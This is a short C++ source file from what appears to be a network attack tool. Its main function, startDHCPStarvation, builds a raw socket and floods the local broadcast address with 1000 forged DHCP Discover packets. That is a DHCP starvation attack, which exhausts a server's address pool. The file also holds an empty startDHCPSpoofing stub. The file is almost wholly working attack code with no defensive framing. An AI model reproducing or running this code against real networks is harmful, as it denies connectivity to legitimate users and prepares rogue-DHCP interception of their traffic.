#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Headers.h"
#include "Utils.h"
#include "Spoofing.h"

#include <time.h>
#include <iostream>
#include <WS2tcpip.h>
#pragma pack(1)
#pragma comment(lib, "Ws2_32.lib")



void startDHCPStarvation(AddressInfo& info)
{
	
	SOCKET s;
	sockaddr_in dst;
	int optval = 1;

	dst.sin_family = AF_INET;
	dst.sin_port = htons(67);								/* difine the destination */
	inet_pton(AF_INET, (char*)info.broadcast, &dst.sin_addr.s_addr);

	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); //Create a RAW socket

#if _DEBUG
	if (s == SOCKET_ERROR)
		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
#endif

	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval); //Set the socket as a RAW socket
	for (int i = 0; i < 1000; i++)
	{
		char* raw_packet = new char[65536];
		CreateDHCPDiscoverPacket(raw_packet, info);

		sendto(
			s,
			raw_packet,
			sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header),
			0, (sockaddr*)&dst,
			sizeof(dst)
		);
		delete[] raw_packet;
		Sleep(20);
	}
}


void startDHCPSpoofing(AddressInfo& info)
{
	
}
